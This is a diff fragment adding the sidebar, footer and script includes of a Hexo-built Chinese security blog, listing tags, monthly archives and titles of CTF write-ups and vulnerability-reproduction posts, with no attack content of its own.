+      <a href="/tags/PHP/" style="font-size: 15px;">PHP</a> <a href="/tags/buuoj/" style="font-size: 20px;">buuoj</a> <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/%E4%B8%AA%E4%BA%BA%E5%BF%83%E5%BE%97/" style="font-size: 10px;">个人心得</a> <a href="/tags/%E6%80%9D%E8%B7%AF%E5%A4%8D%E7%8E%B0/" style="font-size: 10px;">思路复现</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" style="font-size: 10px;">漏洞复现</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">十月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">八月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">五月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">四月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">十二月 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/10/12/%E8%B0%88%E8%B0%88%E5%BF%83%E5%BE%97-%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E6%8C%87%E5%BC%95%E5%8F%8A%E8%B5%84%E6%BA%90%E6%B1%87%E6%80%BB/">谈谈心得|计算机安全学习指引及资源汇总</a>
+          </li>
+        
+          <li>
+            <a href="/2020/08/01/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Egetshell/">漏洞复现|Typecho反序列化漏洞getshell</a>
+          </li>
+        
+          <li>
+            <a href="/2020/05/22/Buuoj-%E7%BD%91%E9%BC%8E%E6%9D%AF2020-%E9%9D%92%E9%BE%99%E7%BB%84-notes/">Buuoj|[网鼎杯2020 青龙组]notes</a>
+          </li>
+        
+          <li>
+            <a href="/2020/04/16/Buuoj-MRCTF2020-Ezpop/">Buuoj|[MRCTF2020]Ezpop</a>
+          </li>
+        
+          <li>
+            <a href="/2020/04/12/%E6%80%9D%E8%B7%AF%E5%A4%8D%E7%8E%B0-%E5%88%A9%E7%94%A8LD-PRELOAD%E8%BF%9B%E8%A1%8C%E5%87%BD%E6%95%B0%E5%8A%AB%E6%8C%81%E7%BB%95%E8%BF%87disable-functions/">思路复现|利用LD_PRELOAD进行函数劫持绕过disable_functions</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2022 Rinlang<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
